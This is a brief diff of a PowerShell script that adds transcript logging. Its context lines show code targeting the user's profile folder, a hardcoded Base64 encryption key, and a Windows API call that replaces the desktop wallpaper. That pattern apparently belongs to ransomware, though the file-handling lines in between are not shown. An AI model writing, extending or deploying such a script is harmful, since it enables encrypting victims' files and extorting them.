@@ -1,3 +1,5 @@
+Start-Transcript -Path "$env:TEMP\log.txt"
+
 # == Setup ==
 $root = $env:USERPROFILE
 $key = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZgAxMjM0NTY3ODlhYmNkZWY=")  
@@ -34,5 +36,7 @@ public class Wallpaper {
     public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 }
 "@
+
+Stop-Transcript
 Add-Type $code
 [Wallpaper]::SystemParametersInfo(20, 0, $localWallpaper, 3)
